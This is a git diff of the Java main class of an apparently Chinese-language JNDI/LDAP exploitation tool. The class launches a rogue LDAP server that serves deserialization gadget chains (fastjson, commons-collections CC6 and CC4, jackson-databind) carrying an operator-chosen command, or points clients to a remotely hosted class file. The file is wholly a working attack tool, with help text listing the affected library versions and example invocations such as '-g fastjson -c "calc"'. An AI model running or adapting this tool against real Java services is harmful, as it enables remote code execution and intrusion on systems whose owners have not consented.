@@ -3,11 +3,12 @@ package org.c3p0ooo;
 import com.unboundid.ldap.listener.InMemoryDirectoryServer;
 import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
 import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import org.apache.commons.cli.*;
+import org.gadget.CC4;
 import org.gadget.CC6;
 import org.gadget.Fastjson;
 import org.gadget.Jackson;
 import org.interceptor.SerialOperationInterceptor;
-import org.gadget.CC4;
 import sun.misc.BASE64Decoder;
 
 import javax.net.ServerSocketFactory;
@@ -17,69 +18,107 @@ import java.io.FileInputStream;
 import java.net.InetAddress;
 
 public class LDAPRefServer {
-
     private static final String LDAP_BASE = "dc=example,dc=com";
 
+
     public static void main(String[] args) throws Exception {
-        System.out.println(" 使用：");
-        System.out.println("【1】LDAP反序列化方式：java -jar LDAPUnserial-Tool.jar LDAP端口 base64/file base64编码后的链/序列化文件路径");
-        System.out.println("【2】请求实例化Class方式：java -jar LDAPUnserial-Tool.jar LDAP端口 class http://xxx.xxx.xxx.xxx:xx/x.class");
-        System.out.println("【3】内置链：java -jar LDAPUnserial-Tool.jar LDAP端口 gadget -h");
-        System.out.println(" 客户端请求：ldap://ip:port/Exploit（名字随意）");
-        System.out.println("------------------------------------------------------------------------");
-        int ldap_port = Integer.valueOf(args[0]);
-        String gadgetType = args[1];
-        if(gadgetType.equals("base64")){
-            String gadget = args[2];
-            BASE64Decoder base64Decoder = new BASE64Decoder();
-            byte[] decode = base64Decoder.decodeBuffer(gadget);
-            lanuchLDAPServer(ldap_port, decode);
-        }else if(gadgetType.equals("file")){
-            FileInputStream fis = new FileInputStream(args[2]);
+        // 创建 Options 对象
+        Options options = new Options();
+        // 添加选项
+        options.addOption("p", "port", true, "LDAP监听的端口，默认1389");
+        options.addOption("f", "file", true, "反序列化打法：序列化数据文件路径");
+        options.addOption("b", "base64", true, "反序列化打法：序列化数据base64编码值");
+        options.addOption("C", "class", true, "低版本动态请求class实例化方式：class文件请求URL（需自己生成class文件，开启web服务）");
+        options.addOption("g", "gadget", true, "内置反序列化链");
+        options.addOption("c", "cmd", true, "使用内置反序列化链时所要执行的命令（存在空格时请使用双引号包裹）");
+
+        // 创建命令行解析器
+        CommandLineParser parser = new DefaultParser();
+        // 解析命令行参数
+        CommandLine cmd = parser.parse(options, args);
+
+        //监听的端口，默认1389
+        Integer ldap_port;
+
+        if(!cmd.hasOption("p")){
+            ldap_port = 1389;
+        }else {
+            ldap_port = Integer.valueOf(cmd.getOptionValue("p"));
+        }
+
+        //以下判断使用方式并执行
+        if(cmd.hasOption("f")){
+            String filepath = cmd.getOptionValue("f");
+            System.out.println("序列化文件：" + filepath);
+            FileInputStream fis = new FileInputStream(filepath);
             byte[] bytes = new byte[fis.available()];
             fis.read(bytes);
             lanuchLDAPServer(ldap_port, bytes);
-        }else if(gadgetType.equals("class")) {
-            String url = args[2];
+        }else if(cmd.hasOption("b")){
+            String base64_ser = cmd.getOptionValue("b");
+            BASE64Decoder base64Decoder = new BASE64Decoder();
+            byte[] decode = base64Decoder.decodeBuffer(base64_ser);
+            lanuchLDAPServer(ldap_port, decode);
+        }else if(cmd.hasOption("C")){
+            String url = cmd.getOptionValue("C");
+            System.out.println("class文件地址：" + url);
             lanuchLDAPServer(ldap_port, url);
-        }else if(gadgetType.equals("gadget")){
-            String gadgetName = "";
-            String common = "";
-            if(args.length >= 3) {gadgetName = args[2];}
-            if(args.length >= 4) {
-                common = args[3];
-                if(common.startsWith("\"") && common.endsWith("\"")){
-                    common = common.substring(1, common.length() - 1);
-                }
-                System.out.println("执行的命令为：" + common);
+        } else if (cmd.hasOption("g")) {
+            //内置链方式命令不能为空
+            if(!cmd.hasOption("c")){
+                System.out.println("缺少'-cmd'参数");
+                System.exit(0);
             }
-            if(gadgetName.isEmpty() || gadgetName.equals("-h")){
-                System.out.println("用法：java -jar LDAPUnserial-Tool.jar LDAP端口 gadget fastjson \"命令\"(必须双引号)");
-                System.out.println("目前支持的链：\nfastjson (影响版本：1.2.49-1.2.83)\n" +
-                        "CC6 (影响版本：<= commons-collections 3.2.1)\n" +
-                        "CC4 (影响版本：commons-collections4 4.0)\n" +
-                        "jackson (影响版本：jackson-databind 2.10.0及以上版本)");
-            }else if(common.isEmpty()){
-                System.out.println("命令不能为空！");
-            }else if(gadgetName.equals("fastjson")){
-                byte[] bytes = Fastjson.getBytes(common);
-                lanuchLDAPServer(ldap_port, bytes);
-            }else if(gadgetName.equals("CC6")){
-                byte[] bytes = CC6.getBytes(common);
-                lanuchLDAPServer(ldap_port, bytes);
-            }else if(gadgetName.equals("jackson")){
-                byte[] bytes = Jackson.getBytes(common);
-                lanuchLDAPServer(ldap_port, bytes);
-            }else if(gadgetName.equals("CC4")){
-                byte[] bytes = CC4.getBytes(common);
-                lanuchLDAPServer(ldap_port, bytes);
-            }else{
-                System.out.println("暂不支持该链！");
+
+            //判断输入的命令首位是否存在双引号，存在便过滤
+            String command = cmd.getOptionValue("c");
+            String gadgetName = cmd.getOptionValue("g");
+            if(command.startsWith("\"") && command.endsWith("\"")){
+                command = command.substring(1, command.length() - 1);
             }
+
+            //判断使用的链子
+            byte[] bytes = null;
+            switch (gadgetName){
+                case "fastjson":
+                    bytes = Fastjson.getBytes(command);
+                    break;
+                case "CC6":
+                    bytes = CC6.getBytes(command);
+                    break;
+                case "jackson":
+                    bytes = Jackson.getBytes(command);
+                    break;
+                case "CC4":
+                    bytes = CC4.getBytes(command);
+                    break;
+                default:
+                    System.out.println("暂不支持该链！");
+                    System.exit(0);
+            }
+            System.out.println("使用"+ gadgetName +"链");
+            System.out.println("执行的命令为：" + command);
+            lanuchLDAPServer(ldap_port, bytes);
         }else {
-            System.out.println("类型错误");
+            // 如果未提供选项，输出帮助信息
+            HelpFormatter formatter = new HelpFormatter();
+            formatter.printHelp("\n【使用】\n" +
+                            "客户端请求：ldap://127.0.0.1:1389/Exploit（名字随意）\n" +
+                            "反序列化文件方式：java -jar LDAPDeserialize-tool.jar -port 1389 -f D:/1.ser\n" +
+                            "反序列化base64方式：java -jar LDAPDeserialize-tool.jar -port 1389 -b base64数据\n" +
+                            "低版本动态请求class：\njava -jar LDAPDeserialize-tool.jar -C http://127.0.0.1:8000/1.class\n" +
+                            "内置反序列化链：\njava -jar LDAPDeserialize-tool.jar -port 1389 -g fastjson -c \"calc\"\n" +
+                            "\n\n" +
+                            "【目前支持的链】\n" +
+                            "fastjson (影响版本：1.2.49-1.2.83)\n" +
+                            "CC6 (影响版本：<= commons-collections 3.2.1)\n" +
+                            "CC4 (影响版本：commons-collections4 4.0)\n" +
+                            "jackson (影响版本：jackson-databind 2.10.0及以上版本)" +
+                            "\n\n\n"
+                    , options);
         }
     }
+
 
 
     public static void lanuchLDAPServer(Integer ldap_port, Object obj) throws Exception {
